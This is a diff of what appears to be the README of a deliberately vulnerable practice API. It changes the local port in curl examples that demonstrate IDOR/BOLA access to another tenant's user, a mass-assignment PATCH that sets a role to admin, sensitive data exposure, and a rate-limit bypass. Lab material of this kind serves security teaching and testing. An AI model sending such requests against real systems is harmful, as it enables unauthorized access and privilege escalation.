@@ -31,22 +31,22 @@ Fields:
 ### IDOR/BOLA
 Request another tenant user directly:
 ```bash
-curl -s http://localhost:8080/users/2
+curl -s http://localhost:18080/users/2
 ```
 
 ### Mass assignment role escalation
 ```bash
-curl -s -X PATCH http://localhost:8080/users/1 \
+curl -s -X PATCH http://localhost:18080/users/1 \
   -H 'content-type: application/json' \
   -d '{"role":"admin"}'
 ```
 
 ### Sensitive data exposure
 ```bash
-curl -s http://localhost:8080/users/1
+curl -s http://localhost:18080/users/1
 ```
 
 ### Rate-limit bypass
 ```bash
-curl -s http://localhost:8080/users/rate-limit-bypass
+curl -s http://localhost:18080/users/rate-limit-bypass
 ```
